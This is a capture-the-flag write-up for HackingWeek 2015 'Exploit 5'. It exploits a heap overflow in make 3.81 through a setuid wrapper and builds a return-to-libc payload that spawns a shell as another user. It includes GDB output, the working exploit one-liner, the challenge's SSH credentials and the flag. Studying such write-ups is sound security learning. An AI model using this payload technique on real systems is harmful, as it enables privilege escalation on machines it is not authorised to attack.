# HackingWeek CTF 2015: Exploit 5
i
**Category:** exploit |
**Points:** 6106 |
**Solves:** 16 |
**Description:**

> Connectez-vous en tant que <code>guest</code> (mot de passe: <code>shu1eKoo</code>) sur la machine <code>37.187.22.21</code>.<br>
> Vous trouverez la clef de validation cachée dans le fichier <code>/home/exploit05/.secret</code>.
>
> ```
> $> ssh guest@37.187.22.21
> ```

___

## Write-up
 

For this exploit05, we have the package `make 3.81`, which is vulnerable to an heap-overflow (cf : https://www.exploit-db.com/exploits/34164/), and `safe-run` (suid binary that launch make).<br>
We'll use this one to try the heap overflow :


```bash
guest@ns314076:/home/exploit05/project$ ./safe-run $(python -c 'print "A"*4000 + "B"*96 + "CCCC" * 4')

make: stat: /home/exploit05/project/AAAAAA...AAAABBBBB...BBBBCCCCCCCCCCCCCCC: File name too long
Segmentation fault
```
<br>

Nice, let's analyse this segfault in GDB :

```bash
guest@ns314076:/home/exploit05/project$ gdb -q -ex "source /tmp/kaluche/peda/peda.py" --args safe-run
gdb-peda$ r $(python -c 'print "A"*4000 + "B"*96 + "CCCC" * 4')

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x43434343 ('CCCC')
ECX: 0x2f2f2f2f ('////')
EDX: 0x2f2f ('//')
ESI: 0x43434343 ('CCCC')
EDI: 0xbfff6b10 --> 0xbfff7dd4 --> 0x80811c8 ("/home/exploit05/project/", 'A' <repeats 176 times>...)
EBP: 0xbfff6aa8 --> 0xbfff8df8 --> 0xbfffb148 --> 0xbfffd488 --> 0x0 
ESP: 0xbfff6a54 --> 0x792e ('.y')
EIP: 0xb7ee54d2 (<strrchr+34>:	mov    dl,BYTE PTR [esi])
EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
```
<br>

Ok, we don't control EIP :'(<br>
After some tries, i finally get this : 


```
gdb-peda$ r $(python -c 'print "A"*4000 + "B"*124 + "C" * 4')
...
Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x42424242 ('BBBB')
ECX: 0x807feb8 --> 0x160 
EDX: 0x807ff98 --> 0x732e ('.s')
ESI: 0x42424242 ('BBBB')
EDI: 0x42424242 ('BBBB')
EBP: 0x42424242 ('BBBB')
ESP: 0xbfff6400 --> 0x792e ('.y')
EIP: 0x43434343 ('CCCC')
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x43434343
[------------------------------------stack-------------------------------------]
0000| 0xbfff6400 --> 0x792e ('.y')
0004| 0xbfff6404 --> 0x0 
0008| 0xbfff6408 --> 0xbfff6458 --> 0x0 
0012| 0xbfff640c --> 0x8084cb8 ('A' <repeats 200 times>...)
0016| 0xbfff6410 --> 0x8084cb8 ('A' <repeats 200 times>...)
0020| 0xbfff6414 --> 0x0 
0024| 0xbfff6418 --> 0x0 
0028| 0xbfff641c --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
** 0x43434343 in ?? () **
```
<br>

EIP is now controlled !<br>
Let's see what protection are enabled :

```
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : disabled
gdb-peda$ aslr
ASLR is OFF
gdb-peda$ 

```
<br>

So we only need to bypass NX.<br>
To do this, we will store `sh ;` in our buffer, change EIP with the address of `system`, add JUNK bytes, and add the address of our buffer.<br>
Here we go :

```
gdb-peda$ r $(python -c 'print "sh;".ljust(4000,"A") + "B"*124 + "C"*4')
Program received signal SIGSEGV, Segmentation fault.
0x43434343 in ?? ()

gdb-peda$ x system
0xb7ea8c30 <system>:	0x890cec83
```
<br>

__SYSTEM > \x30\x8c\xea\xb7__

```
Stopped reason: SIGSEGV
0x43434343 in ?? ()
gdb-peda$ searchmem sh;
Searching for 'sh;' in: None ranges
Found 16 results, display max 16 items:
 [heap] : 0x8077958 ("sh;", 'A' <repeats 197 times>...)
 [heap] : 0x80799e8 ("sh;", 'A' <repeats 197 times>...)
 [heap] : 0x807f1c0 ("sh;", 'A' <repeats 197 times>...)
 [heap] : 0x8080200 ("sh;", 'A' <repeats 197 times>...)
 [heap] : 0x8081240 ("sh;", 'A' <repeats 197 times>...)
 [heap] : 0x808329f ("sh;", 'A' <repeats 197 times>...)
 [heap] : 0x80842e7 ("sh;", 'A' <repeats 197 times>...)
[stack] : 0xbfff4967 ("sh;", 'A' <repeats 197 times>...)
[stack] : 0xbfff5a50 ("sh;", 'A' <repeats 197 times>...)
[stack] : 0xbfff6cc0 ("sh;", 'A' <repeats 197 times>...)
[stack] : 0xbfff7db0 ("sh;", 'A' <repeats 197 times>...)
[stack] : 0xbfff9020 ("sh;", 'A' <repeats 197 times>...)
[stack] : 0xbfffa110 ("sh;", 'A' <repeats 197 times>...)
[stack] : 0xbfffb380 ("sh;", 'A' <repeats 197 times>...)
[stack] : 0xbfffc460 ("sh;", 'A' <repeats 197 times>...)
[stack] : 0xbfffefbe ("sh;", 'A' <repeats 197 times>...)
gdb-peda$ 
```
<br><br>

__BUFFER « sh ; » ADDRESS >  \x58\x79\x07\x08__

We got all we need !<br>
Let's go :

```bash
guest@ns314076:/home/exploit05/project$ ./safe-run $(python -c 'print "sh;".ljust(4000,"A") + "B"*124 + "\x30\x8c\xea\xb7" + "JUNK" + "\x58\x79\x07\x08"')
…
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB0���JUNKX: File name too long
sh-4.2$ id
uid=1000(guest) gid=1000(guest) euid=1005(exploit05) egid=1005(exploit05) groups=1005(exploit05),1000(guest)
sh-4.2$ whoami
exploit05
sh-4.2$ cd /home/exploit05/
sh-4.2$ cat .secret
EiN5ohqu5Ush-4.2$ 
```

__FLAG__: EiN5ohqu5U

And thx to RageYL for the help ;)

Enjoy,<br>
\- [Elkaluche](https://twitter.com/Elkaluche)
